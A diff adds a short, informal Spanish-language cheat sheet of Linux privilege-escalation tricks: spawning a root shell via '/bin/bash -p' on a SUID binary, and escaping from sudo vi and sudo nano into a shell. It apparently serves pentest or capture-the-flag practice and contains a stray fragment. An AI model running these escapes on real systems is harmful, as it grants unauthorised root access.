@@ -1,0 +1,14 @@
+/bin/bash -p si el dueño es root y tiene el permiso -s
+
+
+sudo vi:
+
+:wq
+--ppeeeeero
+
+set shell=/bin/bash
+shell
+
+
+sudo nano
+sudo nano ^+r ^x reset; sh 1>&0 2>&0
